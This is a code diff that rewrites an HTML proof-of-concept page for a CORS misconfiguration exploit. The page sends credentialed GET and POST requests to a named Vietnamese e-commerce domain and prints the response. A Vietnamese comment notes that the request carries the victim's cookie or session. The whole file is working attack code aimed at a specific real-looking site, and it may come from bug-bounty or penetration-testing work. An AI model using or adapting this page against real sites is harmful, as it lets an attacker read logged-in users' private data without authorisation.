@@ -1,22 +1,46 @@
+<!DOCTYPE html>
 <html>
-     <body>
-         <h2>CORS PoC</h2>
-         <div id="demo">
-             <button type="button" onclick="cors()">Exploit</button>
-         </div>
-         <script>
-             function cors() {
-             var xhr = new XMLHttpRequest();
-             xhr.onreadystatechange = function() {
-                 if (this.readyState == 4 && this.status == 200) {
-                 document.getElementById("demo").innerHTML = alert(this.responseText);
-                 }
-             };
-              xhr.open("GET",
-                       "https://fmv-ecom.famimapoint.com.vn/login", true);
-             xhr.withCredentials = true;
-             xhr.send();
-             }
-         </script>
-     </body>
- </html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS PoC</h1>
+  <button id="exploitGet">Exploit (GET)</button>
+  <button id="exploitPost">Exploit (POST, giống traffic gốc)</button>
+  <pre id="output"></pre>
+
+  <script>
+    document.getElementById('exploitGet').addEventListener('click', runGet);
+    document.getElementById('exploitPost').addEventListener('click', runPost);
+
+    function runGet() {
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.onerror = onErr;
+      req.open('GET', 'https://fmv-ecom.famimapoint.com.vn/cdn-cgi/rum', true);
+      req.withCredentials = true; // gửi kèm cookie/session của nạn nhân
+      req.send();
+    }
+
+    function runPost() {
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.onerror = onErr;
+      req.open('POST', 'https://fmv-ecom.famimapoint.com.vn/cdn-cgi/rum?', true);
+      req.withCredentials = true;
+      req.setRequestHeader('Content-Type', 'application/json');
+      // body tối thiểu chỉ để tái hiện request thật; có thể để {} nếu server không kiểm tra schema
+      req.send(JSON.stringify({ eventType: 3 }));
+    }
+
+    function onErr() {
+      document.getElementById('output').innerText = 'Request failed (network/CORS block).';
+    }
+
+    function reqListener() {
+      document.getElementById('output').innerText =
+        'Status: ' + this.status + '\n\n' + this.responseText;
+    }
+  </script>
+</body>
+</html>
